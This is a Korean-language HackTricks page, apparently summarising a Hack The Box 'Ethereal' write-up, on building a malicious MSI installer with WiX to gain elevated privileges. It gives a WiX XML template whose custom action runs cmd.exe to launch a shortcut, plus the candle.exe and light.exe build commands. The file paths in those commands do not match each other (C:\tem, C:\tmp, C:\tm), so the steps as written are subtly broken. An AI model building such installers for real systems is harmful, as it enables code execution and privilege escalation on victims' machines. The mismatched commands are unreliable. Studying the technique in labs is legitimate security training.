{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# 악성 MSI 생성 및 루트 권한 획득

MSI 설치 프로그램의 생성은 wixtools를 사용하여 수행됩니다. 특히 [wixtools](http://wixtoolset.org)가 활용될 것입니다. 대체 MSI 빌더가 시도되었으나, 이 특정 경우에는 성공하지 못했다는 점은 언급할 가치가 있습니다.

wix MSI 사용 예제에 대한 포괄적인 이해를 위해 [이 페이지](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)를 참조하는 것이 좋습니다. 여기에서 wix MSI 사용을 보여주는 다양한 예제를 찾을 수 있습니다.

목표는 lnk 파일을 실행할 MSI를 생성하는 것입니다. 이를 달성하기 위해 다음 XML 코드를 사용할 수 있습니다 ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
패키지 요소에는 InstallerVersion 및 Compressed와 같은 속성이 포함되어 있으며, 이는 각각 설치 프로그램의 버전을 지정하고 패키지가 압축되었는지 여부를 나타냅니다.

생성 과정에는 wixtools의 도구인 candle.exe를 사용하여 msi.xml에서 wixobject를 생성하는 것이 포함됩니다. 다음 명령을 실행해야 합니다:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
또한, 명령과 그 출력이 포함된 이미지가 게시물에 제공된다는 점은 언급할 가치가 있습니다. 시각적 안내를 위해 참조할 수 있습니다.

또한, wixtools의 또 다른 도구인 light.exe가 wixobject에서 MSI 파일을 생성하는 데 사용됩니다. 실행할 명령은 다음과 같습니다:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
이전 명령과 유사하게, 명령과 그 출력 결과를 설명하는 이미지가 게시물에 포함되어 있습니다.

이 요약이 유용한 정보를 제공하는 것을 목표로 하지만, 보다 포괄적인 세부정보와 정확한 지침을 위해 원본 게시물을 참조하는 것이 권장됩니다.

## References
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
